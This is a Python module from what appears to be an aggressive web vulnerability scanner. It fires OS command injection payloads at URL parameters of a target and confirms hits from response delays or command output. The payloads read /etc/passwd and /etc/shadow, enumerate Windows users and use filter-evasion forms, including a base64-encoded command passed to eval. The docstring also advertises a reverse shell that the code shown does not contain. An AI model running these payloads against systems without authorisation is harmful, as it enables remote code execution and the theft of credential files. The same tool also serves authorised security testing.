#!/usr/bin/env python3
"""
⚡ Command Injection ULTRA-AGRESSIF — OWASP A05:2025
RCE complet + reverse shell
"""

import time
from colorama import Fore, Style

# Payloads rapides (détection immédiate)
CMDI_QUICK = ["; id", "| id", "`id`", "$(id)", "& whoami", "| whoami", "; whoami", "\nid", "&& id"]

class CMDIRCE:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self._timeout = getattr(engine, 'request_timeout', 5)

    def scan(self, params):
        print(f"\n{Fore.YELLOW}[⚡ COMMAND INJECTION ULTRA-AGRESSIF] {Style.RESET_ALL}\n")

        cmdi_payloads = list(CMDI_QUICK) + [
            "; cat /etc/passwd",
            "& dir",
            "| cat /etc/passwd",
            "; sleep 3",
        ]
        if self.aggressive:
            cmdi_payloads += [
                "; cat /etc/shadow 2>/dev/null",
                "& net user",
                "| type C:\\Windows\\win.ini",
                "; uname -a",
                "; cat$IFS/etc/passwd",
                "; {cat,/etc/passwd}",
                "; eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
                "| ping -c 3 127.0.0.1",
                "%0a id",
                "`whoami`",
                "$(whoami)",
                "; ping -c 3 127.0.0.1",
                "& ping -n 3 127.0.0.1",
                "| ls -la",
                "; ls -la",
            ]

        try:
            baseline = self.engine.get_baseline()
        except Exception:
            baseline = None
        vulnerabilities = []
        get = getattr(self.engine, 'get', self.engine.session.get)

        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            payload_list = cmdi_payloads[:14] if not self.aggressive else cmdi_payloads
            for payload in payload_list:
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                
                try:
                    if 'sleep' in payload.lower():
                        start = time.time()
                        resp = get(injected_url, timeout=8)
                        elapsed = time.time() - start
                        if elapsed > 3.5:
                            vuln = {
                                'type': 'cmdi',
                                'cwe': 'CWE-78',
                                'param': param,
                                'payload': payload,
                                'url': injected_url,
                                'evidence': f'Time-based RCE: {elapsed:.2f}s'
                            }
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                    
                    else:
                        resp = get(injected_url, timeout=self._timeout)
                        
                        # Indicateurs de sortie de commande (vérification AMÉLIORÉE)
                        cmd_indicators = ['root:x:0:0', 'uid=', 'bin/bash', 'Directory of', 
                                        'Volume Serial', 'C:\\Windows', '/etc/passwd']
                        
                        # 🔍 Vérifier que ce n'est pas une erreur SQL
                        sql_error_patterns = ['sql syntax', 'mysql error', 'pdoexception', 'sqlstate']
                        is_sql_error = any(pattern in resp.text.lower() for pattern in sql_error_patterns)
                        
                        if is_sql_error:
                            continue  # ❌ Faux positif : erreur SQL, pas Command Injection
                        
                        # ✅ Vraie détection Command Injection
                        if any(ind in resp.text for ind in cmd_indicators):
                            vuln = {
                                'type': 'cmdi',
                                'cwe': 'CWE-78',
                                'param': param,
                                'payload': payload,
                                'url': injected_url,
                                'evidence': f"Sortie commande détectée"
                            }
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _print_vuln(self, vuln):
        print(f"\n    {Fore.YELLOW}[💥 Command Injection CONFIRMÉ] {Style.RESET_ALL}{vuln['param']}")
        print(f"      Payload: {vuln['payload']}")
        print(f"      Preuve: {vuln['evidence']}")
        print(f"      URL: {vuln['url']}\n")